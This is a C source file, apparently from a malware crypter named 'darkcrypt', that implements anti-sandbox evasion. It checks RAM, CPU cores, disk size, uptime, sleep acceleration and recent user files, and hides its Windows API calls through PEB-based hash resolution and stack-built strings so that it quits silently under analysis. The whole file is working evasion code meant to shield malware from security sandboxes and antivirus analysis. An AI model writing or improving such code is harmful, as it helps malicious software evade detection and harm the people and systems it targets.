/*
 * sandbox.c — Multi-layer anti-sandbox for darkcrypt
 *
 * Checks:
 * 1. Physical RAM >= 4 GB
 * 2. CPU cores >= 2
 * 3. Disk size >= 60 GB
 * 4. System uptime >= 30 minutes
 * 5. Sleep acceleration (Sleep(3000) + QueryPerformanceCounter verify)
 * 6. Recent user files in Documents folder
 *
 * Every Win32 API is resolved by DJB2 hash from kernel32's export table via
 * peb_resolve_kernel32(HASH_*), so no API name appears in the IAT or .rdata.
 * Each check is staggered with small sleeps to catch time-accelerated sandboxes.
 * On failure: returns FALSE (caller should exit silently).
 */

#include "sandbox.h"
#include "obfuscation.h"
#include "peb.h"
#include <stdio.h>

/* ---- Function-pointer typedefs for each kernel32 API we call ---- */
typedef BOOL  (WINAPI *GlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
typedef void  (WINAPI *GetSystemInfo_t)(LPSYSTEM_INFO);
typedef BOOL  (WINAPI *GetDiskFreeSpaceExA_t)(LPCSTR, PULARGE_INTEGER,
                                             PULARGE_INTEGER, PULARGE_INTEGER);
typedef DWORD (WINAPI *GetTickCount_t)(void);
typedef BOOL  (WINAPI *QueryPerformanceFrequency_t)(LARGE_INTEGER *);
typedef BOOL  (WINAPI *QueryPerformanceCounter_t)(LARGE_INTEGER *);
typedef void  (WINAPI *Sleep_t)(DWORD);
typedef DWORD (WINAPI *GetEnvironmentVariableA_t)(LPCSTR, LPSTR, DWORD);
typedef HANDLE (WINAPI *FindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL  (WINAPI *FindNextFileA_t)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL  (WINAPI *FindClose_t)(HANDLE);
typedef void  (WINAPI *GetSystemTimeAsFileTime_t)(LPFILETIME);

/* ---- Helper: resolve a kernel32 API or return FALSE ----
 * P1: print the hash (compile-time constant), NOT the API name string —
 * the string literal would survive in .rdata even when DBG_PRINTF is dead. */
#define K32_RESOLVE(hash, type, out)                                      \
    do {                                                                    \
        FARPROC _p = peb_resolve_kernel32((hash));                           \
        if (!_p) {                                                           \
            DBG_PRINTF("[sandbox] failed to resolve 0x%08lX\n",             \
                       (unsigned long)(hash));                               \
            return FALSE;                                                    \
        }                                                                   \
        (out) = (type)_p;                                                    \
    } while (0)

/* ---- Check 1: Physical RAM >= 4 GB ---- */
static BOOL check_ram(void)
{
    GlobalMemoryStatusEx_t pGlobalMemoryStatusEx;
    K32_RESOLVE(HASH_GlobalMemoryStatusEx, GlobalMemoryStatusEx_t,
                pGlobalMemoryStatusEx);

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(MEMORYSTATUSEX);
    if (!pGlobalMemoryStatusEx(&mem))
        return FALSE;
    return mem.ullTotalPhys >= (4ULL * 1024 * 1024 * 1024);
}

/* ---- Check 2: CPU cores >= 2 ---- */
static BOOL check_cpu(void)
{
    GetSystemInfo_t pGetSystemInfo;
    K32_RESOLVE(HASH_GetSystemInfo, GetSystemInfo_t, pGetSystemInfo);

    SYSTEM_INFO si;
    pGetSystemInfo(&si);
    return si.dwNumberOfProcessors >= 2;
}

/* ---- Check 3: Disk size >= 60 GB ---- */
static BOOL check_disk(void)
{
    GetDiskFreeSpaceExA_t pGetDiskFreeSpaceExA;
    K32_RESOLVE(HASH_GetDiskFreeSpaceExA, GetDiskFreeSpaceExA_t,
                pGetDiskFreeSpaceExA);

    /* "C:\\" built on the stack — no plaintext literal in .rdata */
    char drive[] = { 'C', ':', '\\', '\0' };
    ULARGE_INTEGER freeBytes, totalBytes;
    if (!pGetDiskFreeSpaceExA(drive, &freeBytes, &totalBytes, NULL))
        return FALSE;
    return totalBytes.QuadPart >= (60ULL * 1024 * 1024 * 1024);
}

/* ---- Check 4: Uptime >= 30 minutes ---- */
static BOOL check_uptime(void)
{
    GetTickCount_t pGetTickCount;
    K32_RESOLVE(HASH_GetTickCount, GetTickCount_t, pGetTickCount);

    DWORD uptime = pGetTickCount();
    return uptime >= (30 * 60 * 1000);
}

/* ---- Check 5: Sleep acceleration ---- */
static BOOL check_sleep_accel(void)
{
    QueryPerformanceFrequency_t pQueryPerformanceFrequency;
    QueryPerformanceCounter_t  pQueryPerformanceCounter;
    Sleep_t                     pSleep;
    K32_RESOLVE(HASH_QueryPerformanceFrequency, QueryPerformanceFrequency_t,
                pQueryPerformanceFrequency);
    K32_RESOLVE(HASH_QueryPerformanceCounter, QueryPerformanceCounter_t,
                pQueryPerformanceCounter);
    K32_RESOLVE(HASH_Sleep, Sleep_t, pSleep);

    LARGE_INTEGER freq, start, end;
    pQueryPerformanceFrequency(&freq);
    pQueryPerformanceCounter(&start);

    pSleep(3000);

    pQueryPerformanceCounter(&end);
    double elapsed_ms = (double)(end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;

    /* If Sleep returned in less than 2.5 seconds, it was accelerated */
    return elapsed_ms >= 2500.0;
}

/* ---- Check 6: Recent user files in Documents ---- */
static BOOL check_user_files(void)
{
    GetEnvironmentVariableA_t pGetEnvironmentVariableA;
    FindFirstFileA_t          pFindFirstFileA;
    FindNextFileA_t           pFindNextFileA;
    FindClose_t               pFindClose;
    GetSystemTimeAsFileTime_t  pGetSystemTimeAsFileTime;
    K32_RESOLVE(HASH_GetEnvironmentVariableA, GetEnvironmentVariableA_t,
                pGetEnvironmentVariableA);
    K32_RESOLVE(HASH_FindFirstFileA, FindFirstFileA_t, pFindFirstFileA);
    K32_RESOLVE(HASH_FindNextFileA, FindNextFileA_t, pFindNextFileA);
    K32_RESOLVE(HASH_FindClose, FindClose_t, pFindClose);
    K32_RESOLVE(HASH_GetSystemTimeAsFileTime, GetSystemTimeAsFileTime_t,
                pGetSystemTimeAsFileTime);

    char path[MAX_PATH];
    /* "USERPROFILE" assembled on stack — no .rdata leak */
    char env_userprofile[] = { 'U','S','E','R','P','R','O','F','I','L','E','\0' };
    if (!pGetEnvironmentVariableA(env_userprofile, path, sizeof(path)))
        return FALSE;

    /* P2: Append \Documents — built on stack (no plaintext literal in .rdata) */
    int len = (int)strlen(path);
    if (len + 16 >= MAX_PATH) return FALSE;
    char docs[] = { 'D','o','c','u','m','e','n','t','s','\0' };
    path[len] = '\\';
    memcpy(path + len + 1, docs, 10);

    /* P5/P6: build the search pattern by manually appending \* to the path
     * — no snprintf (the nocrt __mingw_vsnprintf stub is a no-op that would
     * produce an empty string, silently breaking this check). */
    if (len + 13 >= MAX_PATH) return FALSE;
    char search[MAX_PATH];
    memcpy(search, path, len + 10);   /* path incl. "\Documents" */
    int slen = len + 10;
    search[slen] = '\\';
    search[slen + 1] = '*';
    search[slen + 2] = '\0';

    WIN32_FIND_DATAA fd;

    HANDLE hFind = pFindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return FALSE;

    int file_count = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        file_count++;
        /* Check if file was modified recently (last 7 days) */
        FILETIME ftWrite = fd.ftLastWriteTime;
        FILETIME ftNow;
        pGetSystemTimeAsFileTime(&ftNow);
        /* 7 days = 7 * 24 * 60 * 60 * 10000000 (100ns intervals) */
        ULARGE_INTEGER writeTime, nowTime;
        writeTime.LowPart = ftWrite.dwLowDateTime;
        writeTime.HighPart = ftWrite.dwHighDateTime;
        nowTime.LowPart = ftNow.dwLowDateTime;
        nowTime.HighPart = ftNow.dwHighDateTime;
        if (nowTime.QuadPart - writeTime.QuadPart < (7ULL * 24 * 60 * 60 * 10000000)) {
            pFindClose(hFind);
            return TRUE; /* Found a recently modified file */
        }
    } while (pFindNextFileA(hFind, &fd));

    pFindClose(hFind);
    return file_count > 3; /* At least a few files */
}

/* ---- Staggered sleep resolved by hash ---- */
static void staggered_sleep(DWORD ms)
{
    Sleep_t pSleep = (Sleep_t)peb_resolve_kernel32(HASH_Sleep);
    if (pSleep) pSleep(ms);
}

/* ---- Main sandbox check ---- */
BOOL sandbox_check(void)
{
    /* Stagger checks with small sleeps */
    if (!check_ram())     return FALSE;
    staggered_sleep(500);

    if (!check_cpu())     return FALSE;
    staggered_sleep(500);

    if (!check_disk())    return FALSE;
    staggered_sleep(500);

    if (!check_uptime())  return FALSE;
    staggered_sleep(500);

    if (!check_sleep_accel()) return FALSE;
    staggered_sleep(500);

    if (!check_user_files()) return FALSE;

    return TRUE;
}